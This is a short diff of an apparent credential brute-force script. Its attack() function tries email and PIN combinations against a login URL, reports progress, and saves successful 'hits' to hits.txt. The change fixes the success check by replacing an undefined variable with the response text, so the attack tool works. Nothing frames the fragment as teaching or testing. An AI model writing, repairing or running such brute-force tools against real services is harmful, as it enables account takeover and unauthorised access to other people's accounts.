@@ -23,7 +23,7 @@ def attack(url, email, pin, delay, verbose):
                 print(f"[~] Attempts: {attempts} | Current: {email}:{pin}")
 
         if response.status_code != 500:
-            if "Welcome" in response.text or "Logout" in response.text or email.split('@')[0] in dash.text:
+            if "Welcome" in response.text or "Logout" in response.text or email.split('@')[0] in response.text:
                 print(f"[+] SUCCESS: {email}:{pin}")
                 with open("hits.txt", "a") as f:
                     f.write(f"{email}:{pin}\n")
